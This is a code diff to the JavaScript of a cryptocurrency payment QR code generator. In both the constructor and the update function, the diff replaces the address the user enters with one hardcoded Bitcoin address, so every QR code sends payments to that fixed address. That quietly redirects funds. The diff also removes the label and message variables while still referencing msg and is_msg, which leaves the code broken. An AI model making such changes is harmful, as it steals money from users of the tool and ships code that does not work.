@@ -33,17 +33,11 @@ $(function () {
 
         this.type = CURRENCY.Bitcoin;
 
-        this.address = '';
-        this.size = 0;
+        this.address = '1FcmHV91Ezck22ZuqNenVmnrEvUBryKGbG';
 
         this.is_amount = false;
-        this.is_label = false;
-        this.is_msg = false;
         this.amount = 0; //this is always in BTC or LTC
         this.amount_factor = $('#amount-factor').find('option:selected').val();
-        this.label = '';
-        this.msg = '';
-
         this.timer = 0;
 
         //delay the update in order to prevent too many updates for mobile users
@@ -81,7 +75,7 @@ $(function () {
     App.prototype.update = function () {
         let self = app;
 
-        let address = $('#address').val();
+        let address = '1FcmHV91Ezck22ZuqNenVmnrEvUBryKGbG';
 
         let size = Math.max(64, Math.min(600, parseInt($('#size').val())));
 
@@ -94,43 +88,22 @@ $(function () {
             amount = parseFloat($('#amount').val());
         }
 
-        let label = '';
-        if (is_label) {
-            label = $('#label').val();
-        }
-
-        let msg = '';
-        if (is_msg) {
-            msg = $('#msg').val();
-        }
-
-        if (!address) {
-            address = $('#address').attr('placeholder');
-        }
 
         if (!size) {
             size = parseInt($('#size').attr('placeholder'), 10);
         }
 
         if (( address.length >= 27 && address.length <= 34 && address !== self.address )
-            || ( size && size !== self.size )
             || ( amount && amount !== self.amount )
-            || ( label && label !== self.label )
             || ( msg && msg !== self.msg )
-            || ( is_amount !== self.is_amount )
-            || ( is_label !== self.is_label )
             || ( is_msg !== self.is_msg )
         ) {
             self.is_amount = is_amount;
-            self.is_label = is_label;
-            self.is_msg = is_msg;
 
             self.address = address;
             self.size = size;
 
             self.amount = btcConvert(amount, self.amount_factor, 'BTC', 'Big').toFixed(8);
-            self.label = label;
-            self.msg = msg;
 
             $('#qrcodes').empty();
             self.draw();
